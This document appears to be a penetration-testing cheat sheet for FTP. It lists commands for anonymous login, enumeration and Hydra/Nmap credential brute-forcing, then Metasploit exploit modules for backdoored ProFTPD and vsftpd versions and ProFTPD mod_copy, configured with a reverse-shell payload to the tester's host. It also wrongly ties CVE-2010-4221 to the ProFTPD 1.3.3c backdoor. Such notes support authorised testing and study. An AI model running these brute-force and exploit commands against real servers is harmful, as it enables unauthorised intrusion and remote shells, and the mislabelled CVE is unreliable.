# FTP

**FTP (File Transfer Protocol)**  
**Description**: Unencrypted protocol for transferring files between client and server
**Ports**: TCP 21 (command), TCP 20 (data)	  
**Known Vulnerabilities**: Anonymous login (misconfiguration), Brute-force attacks, Cleartext credential sniffing, FTP Bounce Attack (CVE-1999-0205)

# Basic FTP Usage

```shell
ftp <target_IP> <port_number>
# Opens an FTP connection to the target on the specified port.
# Commands inside ftp: ls, cd, get <file_name>, put <file_name>, exit

ftp <target> # Anonymous login
# When prompted, enter anonymous as both the username and password for login.
```

<br>

# Enumeration with Metasploit and Nmap

```shell
use auxiliary/scanner/ftp/ftp_version
# Scans the FTP service to identify version and banner information.

use auxiliary/scanner/ftp/anonymous
# Checks if the FTP server allows anonymous login.

use auxiliary/scanner/ftp/ftp_login
# Performs brute-force login attempts on the FTP service using user/password lists.

nmap --script ftp-anon -p 21 <target_IP>
# Checks if the FTP server allows anonymous login.

nmap --script ftp-brute --script-args userdb=/root/users -p 21 <target_IP>
# Performs brute-force attack on FTP using a list of usernames.
```

<br>

# Brute-Force with Hydra and Nmap

```shell
hydra -L <user_wordlists> -P <password_wordlists> ftp://<target_IP> -t 4
# Brute-forces FTP login with 4 parallel connections.

hydra -L <user_wordlists> -P <password_wordlists> ftp://<target_IP>:<port>
# Same as above, but specifies a custom FTP port.

hydra -L <user_wordlists> -P <password_wordlists> <target_IP> ftp
# Alternative syntax for brute-forcing FTP without URL format.

echo "sysadmin" > users
# Writes "sysadmin" to the file users, replacing its contents.

nmap --script ftp-brute --script-args userdb=/root/users -p 21 <target_IP>
# Brute-forces FTP usernames from the specified file using Nmap.
```

<br>

# FTP Vulnerability Discovery

```shell
nmap -sV -p 21 --script ftp-proftpd-backdoor <target_IP>
# Checks for a known ProFTPD backdoor vulnerability (CVE-2010-4221).

nmap --script vuln -p 21 <target_IP>
# Runs vulnerability scripts against FTP to detect common issues.

searchsploit ProFTPD
# Searches Exploit-DB for known ProFTPD vulnerabilities based on the detected version.
```

<br>

# Exploiting FTP Vulnerabilities

```shell
use exploit/unix/ftp/proftpd_133c_backdoor
# Exploits a backdoor in ProFTPD 1.3.3c (CVE-2010-4221) to gain a remote root shell.
# Triggered by sending a crafted command to the FTP server.
set payload cmd/unix/reverse
set RHOSTS <target_IP>
set LHOST <local_IP>

use exploit/unix/ftp/vsftpd_234_backdoor
# Exploits a backdoor in vsftpd 2.3.4 that opens a shell on port 6200 after a smiley :) username login attempt.
# Vulnerable version: vsftpd 2.3.4 (intentionally backdoored).

use exploit/unix/ftp/proftpd_modcopy_exec
# ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)
# Exploits the mod_copy module in ProFTPD to copy files from or to any location on the server.
# Allows remote code execution by writing a malicious file into a web-accessible directory.
# Set the variables in msfconsole for RHOSTS , LHOST , and SITEPATH
```
